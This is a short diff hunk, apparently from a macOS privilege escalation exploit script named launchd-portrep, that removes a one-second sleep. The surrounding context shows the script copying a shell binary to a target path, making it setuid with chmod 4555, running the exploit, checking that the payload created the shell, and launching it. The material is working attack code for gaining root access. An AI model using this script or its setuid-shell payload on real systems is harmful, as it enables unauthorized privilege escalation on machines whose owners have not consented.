@@ -34,8 +34,6 @@ SHELL_COMMAND="$(which cp) $(pwd)/suid-sh $TARGET_SHELL; $(which chmod) 4555 $TA
 
 ./launchd-portrep "$SHELL_COMMAND" || error "launchd-portrep failed"
 
-sleep 1
-
 [ -f "$TARGET_SHELL" ] || error "Exploit payload failed to create $TARGET_SHELL"
 
 echo "Launching $TARGET_SHELL"
